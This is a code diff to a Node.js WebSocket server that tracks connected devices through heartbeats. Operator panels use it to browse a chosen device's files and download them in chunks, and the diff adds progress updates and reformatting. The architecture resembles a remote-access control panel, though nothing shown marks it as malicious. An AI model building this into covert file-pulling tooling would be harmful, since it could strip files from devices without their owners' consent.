@@ -40,6 +40,38 @@ const devices = new Map(); // deviceId => { ws, lastSeen, online }
 // In-memory map of active file transfers
 const activeTransfers = new Map(); // transferId => { deviceId, type, path, chunks: {} }
 
+function updateFileTransferProgress(transferId, requestId, deviceId) {
+    const transfer = activeTransfers.get(transferId);
+    if (!transfer) return;
+
+    // Calculate progress based on received chunks
+    const progress = Math.floor(
+        (transfer.receivedChunks / transfer.totalChunks) * 100
+    );
+    const bytesTransferred = Object.values(transfer.chunks).reduce(
+        (total, chunk) => total + (chunk.size || 0),
+        0
+    );
+
+    // Send progress update to web panels
+    wss.clients.forEach(client => {
+        if (client.isPanel && client.readyState === WebSocket.OPEN) {
+            client.send(
+                JSON.stringify({
+                    type: "fileDownloadProgress",
+                    requestId,
+                    deviceId,
+                    transferId,
+                    progress,
+                    bytesTransferred,
+                    totalBytes: transfer.size,
+                    currentFile: transfer.name
+                })
+            );
+        }
+    });
+}
+
 // Broadcast device list to all panels
 function broadcastDeviceList() {
     const panelData = Array.from(devices.entries()).map(([id, data]) => ({
@@ -94,41 +126,52 @@ wss.on("connection", (ws, req) => {
             }
 
             if (data.type === "heartbeat") {
-              console.log("HR")
-    const { deviceId } = data;
-    if (devices.has(deviceId)) {
-        const existing = devices.get(deviceId);
-        existing.lastSeen = new Date().toISOString();
-        existing.online = true;
-        devices.set(deviceId, existing);
-        
-        // Send heartbeat response back to the device immediately
-        if (existing.ws && existing.ws.readyState === WebSocket.OPEN) {
-            existing.ws.send(
-                JSON.stringify({
-                    type: "heartbeatResponse",
-                    timestamp: Date.now()
-                })
-            );
-            console.log(`[*] Sent heartbeat response to device: ${deviceId}`);
-        } else {
-            console.warn(`[!] Cannot send heartbeat response - WebSocket not open for device: ${deviceId}`);
-        }
-        
-        broadcastDeviceList();
-    } else {
-        console.warn(`[!] Received heartbeat from unknown device: ${deviceId}`);
-        
-        // If we don't recognize the device, ask it to reconnect
-        if (ws.readyState === WebSocket.OPEN) {
-            ws.send(
-                JSON.stringify({
-                    type: "reconnectRequest",
-                    message: "Device not recognized, please reconnect"
-                })
-            );
-        }
-    }}
+                console.log("HR");
+                const { deviceId } = data;
+                if (devices.has(deviceId)) {
+                    const existing = devices.get(deviceId);
+                    existing.lastSeen = new Date().toISOString();
+                    existing.online = true;
+                    devices.set(deviceId, existing);
+
+                    // Send heartbeat response back to the device immediately
+                    if (
+                        existing.ws &&
+                        existing.ws.readyState === WebSocket.OPEN
+                    ) {
+                        existing.ws.send(
+                            JSON.stringify({
+                                type: "heartbeatResponse",
+                                timestamp: Date.now()
+                            })
+                        );
+                        console.log(
+                            `[*] Sent heartbeat response to device: ${deviceId}`
+                        );
+                    } else {
+                        console.warn(
+                            `[!] Cannot send heartbeat response - WebSocket not open for device: ${deviceId}`
+                        );
+                    }
+
+                    broadcastDeviceList();
+                } else {
+                    console.warn(
+                        `[!] Received heartbeat from unknown device: ${deviceId}`
+                    );
+
+                    // If we don't recognize the device, ask it to reconnect
+                    if (ws.readyState === WebSocket.OPEN) {
+                        ws.send(
+                            JSON.stringify({
+                                type: "reconnectRequest",
+                                message:
+                                    "Device not recognized, please reconnect"
+                            })
+                        );
+                    }
+                }
+            }
 
             // Panel connected
             if (data.type === "panelConnect") {
@@ -157,31 +200,35 @@ wss.on("connection", (ws, req) => {
 
             // Panel requested file explorer action
             if (data.type === "fileExplorer") {
-    const { targetId, action, path } = data;
-    // Add pagination parameters if they exist
-    const page = data.page || 1;
-    const pageSize = data.pageSize || 50;
-    
-    const device = devices.get(targetId);
-    if (device && device.ws && device.ws.readyState === WebSocket.OPEN) {
-        device.ws.send(
-            JSON.stringify({
-                type: "fileExplorer",
-                action: action,
-                path: path,
-                page: page,
-                pageSize: pageSize
-            })
-        );
-    }
-}
+                const { targetId, action, path } = data;
+                // Add pagination parameters if they exist
+                const page = data.page || 1;
+                const pageSize = data.pageSize || 50;
+
+                const device = devices.get(targetId);
+                if (
+                    device &&
+                    device.ws &&
+                    device.ws.readyState === WebSocket.OPEN
+                ) {
+                    device.ws.send(
+                        JSON.stringify({
+                            type: "fileExplorer",
+                            action: action,
+                            path: path,
+                            page: page,
+                            pageSize: pageSize
+                        })
+                    );
+                }
+            }
 
             // Panel requested file/folder download
             if (data.type === "fileDownload") {
                 const { targetId, path, downloadType } = data;
                 const requestId = uuidv4();
                 const device = devices.get(targetId);
-                const decodedPath = decodeURIComponent(path)
+                const decodedPath = decodeURIComponent(path);
 
                 if (
                     device &&
@@ -295,9 +342,9 @@ wss.on("connection", (ws, req) => {
                         break;
 
                     case "chunk":
-                        // Process a file chunk
                         const {
                             chunkIndex,
+                            totalChunks,
                             data: base64Data,
                             size: chunkSize
                         } = data;
@@ -310,6 +357,18 @@ wss.on("connection", (ws, req) => {
                                 size: chunkSize
                             };
                             transfer.receivedChunks++;
+
+                            // Send progress update after every 5 chunks or when it's the last chunk
+                            if (
+                                chunkIndex % 5 === 0 ||
+                                chunkIndex === totalChunks - 1
+                            ) {
+                                updateFileTransferProgress(
+                                    transferId,
+                                    requestId,
+                                    deviceId
+                                );
+                            }
 
                             // If we've received all chunks, write the file
                             if (
